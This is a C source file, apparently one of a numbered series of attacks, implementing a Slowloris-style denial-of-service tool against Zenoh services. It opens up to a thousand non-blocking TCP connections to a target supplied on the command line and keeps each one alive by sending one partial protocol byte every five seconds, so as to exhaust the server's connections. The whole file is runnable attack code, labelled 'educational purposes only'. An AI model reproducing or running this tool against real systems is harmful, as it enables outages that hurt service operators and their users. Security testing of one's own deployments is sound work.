/*
 * Attack 10: Slowloris-Style Connection Exhaustion
 * Opens many TCP connections and keeps them alive slowly
 * 
 * Compile: gcc -o attack10_slowloris attack_10_slowloris.c -pthread
 * Run: ./attack10_slowloris <target_ip> <target_port> <connections>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>

#define Z_MSG_INIT 0x04
#define MAX_CONNECTIONS 1000

static volatile int g_running = 1;
static int g_active_connections = 0;
static pthread_mutex_t g_conn_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    int sock_fd;
    time_t created_at;
    int bytes_sent;
    int active;
} connection_t;

typedef struct {
    char *target_ip;
    int target_port;
    connection_t *connections;
    int max_connections;
} slowloris_ctx_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping slowloris attack...\n");
    g_running = 0;
}

void* connection_thread(void *arg) {
    slowloris_ctx_t *ctx = (slowloris_ctx_t*)arg;
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(ctx->target_port);
    inet_pton(AF_INET, ctx->target_ip, &target_addr.sin_addr);
    
    printf("[+] Connection thread started\n");
    
    while (g_running) {
        pthread_mutex_lock(&g_conn_mutex);
        
        // Try to open new connections
        for (int i = 0; i < ctx->max_connections && g_running; i++) {
            if (ctx->connections[i].active) continue;
            
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            // Set non-blocking
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            
            // Try to connect (non-blocking)
            connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
            
            ctx->connections[i].sock_fd = sock;
            ctx->connections[i].created_at = time(NULL);
            ctx->connections[i].bytes_sent = 0;
            ctx->connections[i].active = 1;
            g_active_connections++;
            
            printf("[+] Connection %d opened (total: %d)\n", i, g_active_connections);
        }
        
        pthread_mutex_unlock(&g_conn_mutex);
        sleep(1);
    }
    
    return NULL;
}

void* keepalive_thread(void *arg) {
    slowloris_ctx_t *ctx = (slowloris_ctx_t*)arg;
    unsigned char partial_init[10];
    
    printf("[+] Keepalive thread started\n");
    
    while (g_running) {
        pthread_mutex_lock(&g_conn_mutex);
        
        for (int i = 0; i < ctx->max_connections; i++) {
            if (!ctx->connections[i].active) continue;
            
            // Send partial/incomplete INIT message (very slowly)
            int byte_to_send = ctx->connections[i].bytes_sent % 10;
            
            if (byte_to_send == 0) {
                partial_init[0] = Z_MSG_INIT;
            } else {
                partial_init[0] = 0x00; // Garbage byte
            }
            
            ssize_t sent = send(ctx->connections[i].sock_fd, 
                               &partial_init[0], 1, MSG_DONTWAIT);
            
            if (sent > 0) {
                ctx->connections[i].bytes_sent++;
            } else if (sent < 0) {
                // Connection dead, close it
                close(ctx->connections[i].sock_fd);
                ctx->connections[i].active = 0;
                g_active_connections--;
                printf("[-] Connection %d died (total: %d)\n", i, g_active_connections);
            }
        }
        
        pthread_mutex_unlock(&g_conn_mutex);
        
        sleep(5); // Send one byte every 5 seconds per connection
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <connections>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 500\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int max_connections = atoi(argv[3]);
    
    if (max_connections > MAX_CONNECTIONS) {
        max_connections = MAX_CONNECTIONS;
    }
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Slowloris Connection Exhaustion    ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Max connections: %d\n", max_connections);
    printf("[*] Strategy: Open many slow connections\n\n");
    
    signal(SIGINT, signal_handler);
    
    slowloris_ctx_t ctx = {
        .target_ip = target_ip,
        .target_port = target_port,
        .connections = calloc(max_connections, sizeof(connection_t)),
        .max_connections = max_connections
    };
    
    if (!ctx.connections) {
        fprintf(stderr, "[-] Failed to allocate connection array\n");
        return 1;
    }
    
    pthread_t conn_thread, keep_thread;
    pthread_create(&conn_thread, NULL, connection_thread, &ctx);
    pthread_create(&keep_thread, NULL, keepalive_thread, &ctx);
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(10);
        printf("[*] Active connections: %d\n", g_active_connections);
    }
    
    pthread_join(conn_thread, NULL);
    pthread_join(keep_thread, NULL);
    
    // Cleanup
    for (int i = 0; i < max_connections; i++) {
        if (ctx.connections[i].active) {
            close(ctx.connections[i].sock_fd);
        }
    }
    free(ctx.connections);
    
    printf("\n[*] Attack stopped\n");
    return 0;
}